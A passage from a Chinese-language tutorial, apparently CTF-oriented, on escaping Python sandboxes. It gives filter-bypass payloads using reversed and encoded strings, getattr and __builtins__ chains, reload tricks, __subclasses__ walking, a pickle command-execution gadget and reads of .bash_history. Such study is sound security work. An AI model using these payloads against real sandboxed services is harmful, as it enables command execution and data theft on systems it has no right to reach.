<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b = &#x27;o&#x27; </span><br><span class="line">a = &#x27;s&#x27;</span><br><span class="line">__import__(b+a).system(&#x27;ls&#x27;)</span><br><span class="line">即：__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720104348087.png"
                      alt="image-20230720104348087"
                ></p>
<p>当然我们也可以逆序配合eval和exec来使用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;[::-1])</span><br><span class="line">exec(&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;[::-1])</span><br></pre></td></tr></table></figure></div>

<p>当然这是一些基本的逃逸方式，对于python沙箱逃逸来说，php的字符过滤绕过方式同样适用</p>
<p>逆序，拼接，编码等等这些都可以应用于沙箱逃逸</p>
<p>这里还以os被过滤为例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__import__(base64.b64decode(&#x27;b3M=&#x27;).decode(&#x27;utf-8&#x27;)).system(&#x27;dir&#x27;)</span><br><span class="line">__import__(&#x27;\x6f\x73&#x27;).system(&#x27;dir&#x27;)#16进制编码</span><br><span class="line">__import__(&#x27;\u006f\u0073&#x27;).system(&#x27;dir&#x27;)#unicode编码</span><br><span class="line">__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;dir&#x27;)#拼接</span><br><span class="line">__import__(&#x27;o&#x27;&#x27;s&#x27;).system(&#x27;dir&#x27;)#拼接</span><br><span class="line">__import__(&#x27;o&#x27;.__add__(&#x27;s&#x27;)).system(&#x27;dir&#x27;)#add是字符串的内置方法，用于拼接字符串</span><br><span class="line">__import__(&#x27;%c%c&#x27;% (111,115)).system(&#x27;dir&#x27;)#格式化字符串表示</span><br></pre></td></tr></table></figure></div>

<p>我们通过格式化字符串表示整个paylaod:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__import__(os).system(&#x27;dir&#x27;)</span><br><span class="line">&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c&#x27; %(95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,115,121,115,116,101,109,40,39,100,105,114,39,41)</span><br></pre></td></tr></table></figure></div>

<p>但是这里直接执行时不行的，因为我们这样构造出来的其实是一个字符串形式的代码，所以为了实现字符串 <code>&#39;os.system(&quot;dir&quot;)&#39;</code> 的执行，需要使用 <code>eval()</code> 函数。<code>eval()</code> 函数将字符串作为Python表达式进行解析和执行，并且返回表达式的结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720114616897.png"
                      alt="image-20230720114616897"
                ></p>
<p>那这种方式我们几乎所有的字符串都可以构造</p>
<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤[]</h3><p>这就是很常规的过滤了</p>
<p>我们可以将[]用pop或者<code>__getitem__</code>代替</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&#x27;linecache&#x27;).os.popen(&#x27;whoami&#x27;).read()</span><br></pre></td></tr></table></figure></div>

<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p><strong>chr()</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))</span><br></pre></td></tr></table></figure></div>

<p><strong>利用str和[]拼接字符</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os.system(str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(().__class__.__new__)[10]+str(().__class__.__new__)[3]</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>当然str被过滤，我们可以使用type(‘’)()、format</p>
<p>在 Python 中，<code>type</code> 是一个内置函数，可以用于创建新的类型或查看对象的类型。当 <code>type</code> 函数只传入一个参数时，它会返回该参数的类型。但是，当 <code>type</code> 函数传入三个参数时，它会返回一个新的类型对象，其中第一个参数是类型的名称，第二个参数是基类（继承的父类），第三个参数是一个包含类的属性和方法的字典。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 构造一个空的字符串实例</span><br><span class="line">str_instance = type(&#x27;&#x27;)()</span><br><span class="line"></span><br><span class="line"># 构造一个整数实例</span><br><span class="line">int_instance = type(42)()</span><br><span class="line"></span><br><span class="line"># 构造一个空列表实例</span><br><span class="line">list_instance = type([])()</span><br><span class="line"></span><br><span class="line"># 构造一个自定义类的实例</span><br><span class="line">MyClass = type(&#x27;MyClass&#x27;, (object,), &#123;&#x27;x&#x27;: 10&#125;)</span><br><span class="line">my_instance = MyClass()</span><br><span class="line"></span><br><span class="line"># 输出实例类型</span><br><span class="line">print(type(str_instance))   # &lt;class &#x27;str&#x27;&gt;</span><br><span class="line">print(type(int_instance))   # &lt;class &#x27;int&#x27;&gt;</span><br><span class="line">print(type(list_instance))  # &lt;class &#x27;list&#x27;&gt;</span><br><span class="line">print(type(my_instance))    # &lt;class &#x27;__main__.MyClass&#x27;&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>这个在我们上面过滤字符串就有应用了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(chr(37)+str(&#123;&#125;.__class__)[1])%100 == &#x27;d&#x27;</span><br></pre></td></tr></table></figure></div>

<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;whoami&#x27;</span><br><span class="line">list(dict(whoami=1))[0]</span><br><span class="line">str(dict(whoami=1))[2:8]</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720194250429.png"
                      alt="image-20230720194250429"
                ></p>
<h3 id="过滤数字"><a href="#过滤数字" class="headerlink" title="过滤数字"></a>过滤数字</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0:int(bool([]))、Flase、len([])、any(())</span><br><span class="line">1:int(bool([&quot;&quot;]))、True、all(())、int(list(list(dict(a၁=())).pop()).pop())</span><br><span class="line"></span><br><span class="line">len(str(&#123;&#125;.keys)) 但是需要找长度合适的字符串</span><br><span class="line"></span><br><span class="line">1.0 float(True)</span><br><span class="line"></span><br><span class="line">-1：~0</span><br><span class="line">其实通过0就可以构造出所有</span><br><span class="line">0 ** 0 == 1</span><br><span class="line">1 + 1 == 2</span><br><span class="line">2 + 1 == 3</span><br><span class="line">2 ** 2 == 4</span><br></pre></td></tr></table></figure></div>

<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>我们可以通过(),[]替换掉</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[i for i in range(10) if i == 5] </span><br><span class="line">可以替换为 </span><br><span class="line">[[i][0]for(i)in(range(10))if(i)==5]</span><br></pre></td></tr></table></figure></div>

<p>这里应该编码可以绕过，类似于php上面的空格绕过手法</p>
<h2 id="sys-modules恢复"><a href="#sys-modules恢复" class="headerlink" title="sys.modules恢复"></a>sys.modules恢复</h2><p>我们上面说sys.modules是一个字典，里面储存了加载过的模块信息，在python启动的时候，解释器会自动加载一些默认模块例如os、sys、math等，但是我们不能够直接使用，sys.modules未经inport加载的模块对当前空间是不可见的，但是我们可以通过 <code>sys.modules</code> 来使用如 sys.modules[“os”]</p>
<p>那么经过上面我们那么多种绕过对os的过滤方法，那我们可不可以直接把os模块给删除了，这样攻击者就不能调用os模块来进行命令执行</p>
<p>但是这样真的行吗？我们来尝试一下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;</span><br><span class="line">import os</span><br><span class="line">os.system(&#x27;dir&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720122459683.png"
                      alt="image-20230720122459683"
                ></p>
<p>上面我们用的是替换模块值，那我们这里直接用del删除了试试</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;</span><br><span class="line"></span><br><span class="line">del sys.modules[&#x27;os&#x27;]</span><br><span class="line">import os</span><br><span class="line">os.system(&#x27;dir&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720122635251.png"
                      alt="image-20230720122635251"
                ></p>
<p>根据运行结果我们可以看到我们用了del sys.modules[‘os’] 命令可以执行成功</p>
<p>我们上面说了，当import导入一个模块时，会先检查sys,modules里面是否已经有这个模块，如果有则不加载，如果没有则会为这个模块创建module对象并加载这个模块</p>
<p>所有我们通过del删除模块，只会让python在导入一次</p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>在沙箱中最常见的就是把一下命令执行方法或者模块给ban掉。</p>
<p>这种我们在php中也很常见，我们在php中的绕过方法就是使用其他的命令执行函数</p>
<p>在python中同样存在很多可以进行命令执行和文件操作的方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">os.system(&#x27;whoami&#x27;)</span><br><span class="line">os.popen(&#x27;whoami&#x27;).read()</span><br><span class="line"># Python2</span><br><span class="line">os.popen2(&#x27;whoami&#x27;).read()</span><br><span class="line">os.popen3(&#x27;whoami&#x27;).read()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">subprocess.call(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.check_call(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.check_output(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.Popen(&#x27;whoami&#x27;, shell=True)</span><br><span class="line"># Python3</span><br><span class="line">subprocess.run(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.getoutput(&#x27;whoami&#x27;)</span><br><span class="line">subprocess.getstatusoutput(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line">platform.popen(&#x27;whoami&#x27;).read()</span><br><span class="line"></span><br><span class="line"># Python2</span><br><span class="line">commands.getoutput(&#x27;whoami&#x27;)</span><br><span class="line">commands.getstatusoutput(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line">timeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;, number=1)</span><br><span class="line"></span><br><span class="line">bdb.os.system(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line">cgi.os.system(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line">importlib.import_module(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br><span class="line"># Python3</span><br><span class="line">importlib.__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line">pickle.loads(b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;)</span><br><span class="line"></span><br><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br><span class="line">exec(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br><span class="line">exec(compile(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;, &#x27;&#x27;, &#x27;exec&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Linux</span><br><span class="line">pty.spawn(&#x27;whoami&#x27;)</span><br><span class="line">pty.os.system(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 文件操作</span><br><span class="line">open(&#x27;.bash_history&#x27;).read()</span><br><span class="line">linecache.getlines(&#x27;.bash_history&#x27;)</span><br><span class="line">codecs.open(&#x27;.bash_history&#x27;).read()</span><br><span class="line"></span><br><span class="line"># Python2</span><br><span class="line">file(&#x27;.bash_history&#x27;).read()</span><br><span class="line">types.FileType(&#x27;.bash_history&#x27;).read()</span><br><span class="line">commands.getstatus(&#x27;.bash_history&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 函数参数</span><br><span class="line">foo.__code__.co_argcount</span><br><span class="line"># Python2</span><br><span class="line">foo.func_code.co_argcount</span><br><span class="line"></span><br><span class="line"># 函数字节码</span><br><span class="line">foo.__code__.co_code</span><br><span class="line"># Python2</span><br><span class="line">foo.func_code.co_code</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>除了用其他命令执行函数来代替我们还可以使用<code>getattr</code> 拿到对象的方法、属性</p>
<p>我们这里先简单了解一下这个函数</p>
<p><code>getattr()</code> 是一个内置函数，用于获取对象的属性值。它接受三个参数：对象、属性名和可选的默认值。当对象拥有指定的属性时，<code>getattr()</code> 返回该属性的值；如果对象没有该属性，则可以提供默认值作为返回值。</p>
<p>语法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(object, name[, default])</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>object</code>: 要获取属性的对象。</li>
<li><code>name</code>: 属性名，一个字符串，表示要获取的属性的名称。</li>
<li><code>default</code> (可选): 如果对象没有指定的属性，则返回这个默认值。</li>
</ul>
<p>示例代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">person = &#123;&#x27;name&#x27;: &#x27;John&#x27;, &#x27;age&#x27;: 30&#125;</span><br><span class="line">name = getattr(person, &#x27;name&#x27;)</span><br><span class="line">print(name)  # 输出: John</span><br><span class="line"></span><br><span class="line">获取类的方法：</span><br><span class="line">class MyClass:</span><br><span class="line">    def say_hello(self):</span><br><span class="line">        print(&quot;Hello, world!&quot;)</span><br><span class="line"></span><br><span class="line">method = getattr(MyClass(), &#x27;say_hello&#x27;)</span><br><span class="line">method()  # 输出: Hello, world!</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>那么基于这种特性我们可以获取模块中的属性或者方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">getattr(os, &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>即使import被过滤我们仍然可以使用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(__builtins__, &#x27;__tropmi__&#x27;[::-1])(&#x27;so&#x27;[::-1]), &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720124505474.png"
                      alt="image-20230720124505474"
                ></p>
<p>那么这样的话，我们也可以通过这个手法来逃逸对import有限制的沙箱</p>
<h2 id="内置模块的应用"><a href="#内置模块的应用" class="headerlink" title="内置模块的应用"></a>内置模块的应用</h2><p>在上面我们通过getattr函数去获取模块中的属性或者方法，当import被禁用了，我们这里是通过getattr方法获取到<code>__builtins__</code>中的import。</p>
<p>但是我们可以发现我们在使用<code>__builtins_</code>并没有导入，这是因为在python中，有很多函数不需要任何import导入就可以使用。</p>
<p>这是因为python中存在一种内置模块,包含了一下常用的内置函数，和工具，在python解释器刚启动的时候内置模块就会自动加载</p>
<p>并且其中的内置功能会被添加到全局命名空间中，使得我们可以直接在任何地方使用，无需额外导入。</p>
<p>然后我们这里了解一下<code>__builtins__</code>  <code>builtins</code> <code>__builtin__</code> </p>
<p><code>__builtins__</code> 是一个在 Python 启动时创建的特殊变量，它是一个字典，它包含了所有内置的函数、异常和异常工具。在python解释器刚启动的时候，<code>__builtins__</code>模块会自动加载，并且其中的内置功能会被添加到全局命名空间中，使得我们可以直接在任何地方使用，无需额外导入，存在于python2和python3中。</p>
<p><code>builtins</code> 是 Python 3 中的内置模块，包含了所有内置的函数、异常和常用工具。在 Python 3 中，你可以使用 <code>import builtins</code> 来导入 <code>builtins</code> 模块，并使用 <code>builtins</code> 来访问其中的内置功能。</p>
<p><code>__builtin__</code> 是 Python 2 中的内置模块，与 Python 3 中的 <code>builtins</code> 扮演相同的角色。它包含了所有内置的函数、异常和常用工具。</p>
<p>关于三者的具体描述和区别可以参考这篇文章</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://blog.51cto.com/xpleaf/1764849" >https://blog.51cto.com/xpleaf/1764849 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>我们通过遍历可以看到<code>__builtins__</code>中有很多内置函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for name in dir(__builtins__):</span><br><span class="line">    print(name)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720151933663.png"
                      alt="image-20230720151933663"
                ></p>
<p>可以看到在这里面存在<code>__import__</code>、eval这些危险函数</p>
<p>但是因为<code>__builtins__</code>是一个模块，所有我们如果想要调用里面的函数，我们需要通过<code>__dict__</code>属性</p>
<ol>
<li>内置的数据类型没有 <code>__dict__</code> 属性</li>
<li>每个类有自己的 <code>__dict__</code> 属性，就算存着继承关系，父类的 <code>__dict__</code> 并不会影响子类的 <code>__dict__</code></li>
<li>对象也有自己的 <code>__dict__</code> 属性，包含 <code>self.xxx</code> 这种实例属性</li>
</ol>
<p>哪这样的话我们就可以通过<code>__builtins__</code>进行命令执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720153018926.png"
                      alt="image-20230720153018926"
                ></p>
<p>那么这样我们可以看到这个内置模块的存在很多危险函数</p>
<p>那么一些环境为了安全就会把这是内置模块中的危险方法给删除掉</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">del __builtins__.__dict__[&#x27;__import__&#x27;]</span><br><span class="line">del __builtins__.__dict__[&#x27;eval&#x27;]</span><br><span class="line">del __builtins__.__dict__[&#x27;exec&#x27;]</span><br><span class="line">del __builtins__.__dict__[&#x27;execfile&#x27;]</span><br><span class="line">del __builtins__.__dict__[&#x27;getattr&#x27;]</span><br><span class="line">del __builtins__.__dict__[&#x27;input&#x27;]</span><br></pre></td></tr></table></figure></div>

<p>但是我们可以通过重写导入内建模块，从而恢复这些内置方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">imp.reload(__builtins__)</span><br><span class="line"></span><br><span class="line"># Python2</span><br><span class="line">reload(__builtins__)</span><br><span class="line">python2中reload也是内建模块，可以通过del __builtins__.reload删掉。</span><br></pre></td></tr></table></figure></div>

<h2 id="利用继承关系构造逃逸链进行逃逸"><a href="#利用继承关系构造逃逸链进行逃逸" class="headerlink" title="利用继承关系构造逃逸链进行逃逸"></a>利用继承关系构造逃逸链进行逃逸</h2><p>在python中允许多重继承，当一个类继承多哥父类的时候，可能存在同名方法，为了确定方法的调用顺序。python使用mro算法来决定使用那个父类的方法</p>
<p>mro就是方法解析顺序，我们可以通过查看类的<code>__mro__</code>属性或者调用.mro来查看类的方法解析顺序。</p>
<p>示例代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class A:</span><br><span class="line">    def hello(self):</span><br><span class="line">        print(&quot;Hello from A&quot;)</span><br><span class="line"></span><br><span class="line">class B(A):</span><br><span class="line">    def hello(self):</span><br><span class="line">        print(&quot;Hello from B&quot;)</span><br><span class="line">        super().hello()</span><br><span class="line"></span><br><span class="line">class C(A):</span><br><span class="line">    def hello(self):</span><br><span class="line">        print(&quot;Hello from C&quot;)</span><br><span class="line">        super().hello()</span><br><span class="line"></span><br><span class="line">class D(B, C):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"># 查看类 D 的方法解析顺序</span><br><span class="line">mro_d = D.mro()</span><br><span class="line">print(mro_d)</span><br><span class="line"># 输出: [&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;]</span><br></pre></td></tr></table></figure></div>

<p>在 Python 中，类的实例可以通过 <code>__class__</code> 属性来获取其对应的类。这个属性指向创建该实例的类。同时，Python 3 中新式类默认继承 <code>object</code> 类，因此几乎所有的类都是 object 的子类</p>
<p>以下是关于 <code>__class__</code>、<code>__base__</code> 和 <code>__bases__</code> 的一些说明：</p>
<ol>
<li><code>__class__</code> 属性：这是一个指向类的引用，通过实例可以获取其所属的类。</li>
<li><code>__base__</code> 属性：<code>__base__</code> 是 Python 2 中的特性，它指向类的直接父类。在 Python 3 中不再使用 <code>__base__</code> 属性。</li>
<li><code>__bases__</code> 属性：<code>__bases__</code> 是 Python 2 和 Python 3 中共有的属性，它是一个元组，包含了类的所有父类。对于新式类，<code>__bases__</code> 中的第一个元素一定是 <code>object</code> 类。</li>
</ol>
<h3 id="object的子类导入危险模块"><a href="#object的子类导入危险模块" class="headerlink" title="object的子类导入危险模块"></a>object的子类导入危险模块</h3><p>如果object的子类导入了危险模块，那我们就可以链式调用危险方法</p>
<p>那么我们如何利用他进行沙箱逃逸呢？</p>
<p>我们这里还以os为例：</p>
<p>os模块被禁止导致我们不能够直接导入os模块进行使用，但是site库里面有os，那我们就可与通过site库调用os</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720155649453.png"
                      alt="image-20230720155649453"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720155737200.png"
                      alt="image-20230720155737200"
                ></p>
<p>那么只要我们能够引入site，那么我们就可以使用os</p>
<p>当然，site也可能会被禁用</p>
<p>但是正如我们在内置模块中的应用一样，我们可以通过reload重新导入，加载os</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720160914809.png"
                      alt="image-20230720160914809"
                ></p>
<p>我们上面说了，所有类都继承于object类</p>
<p>那我们可以通过<code>__subclasses__</code>查看他的子类</p>
<p>那我们这里先构造获取到object类</p>
